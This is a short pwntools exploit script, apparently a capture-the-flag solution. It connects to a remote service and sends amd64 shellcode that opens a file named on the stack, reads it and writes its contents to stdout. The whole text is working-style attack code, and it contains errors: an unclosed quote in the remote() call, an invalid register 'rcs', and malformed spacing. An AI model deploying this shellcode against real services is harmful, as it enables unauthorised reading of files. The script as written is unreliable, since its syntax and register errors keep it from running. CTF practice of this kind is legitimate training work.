from pwn import *
p = remote ('10.81.0.74, 14003) 

context.clear(arch='amd64' , os= 'linux')

payload = asm('mov rax, 1954051118')
payload += asm( 'push rax')
payload += asm('mov rax, 7957654311249866351') 
payload += asm('push rax')
payload += asm('mov rax, 7515207503850858576')
payload += asm('push rax')

payload += asm('mov rax, 0x2') 
payload += asm('mov rdi, rsp')
payload += asm('xor rsi, rsi')
payload += asm( 'xor rdx, rdx') 
payload += asm('syscall')

payload += asm('mov rcx, rax') 
payload += asm('xor rax, rax')
payload += asm('mov rdi, rcs')
payload += asm('mov rsi, rsp') 
payload += asm('mov rdx, 0x50')
payload += asm('syscall')


payload += asm('mov rcx, rax')
payload += asm('mov rax, 0x1')
payload += asm('mov rdi, 0x1')
payload += asm('mov rsi, rsp')
payload += asm('mov rdx, rcx')
payload += asm('syscall')
# send payload
p. sendline (payload)
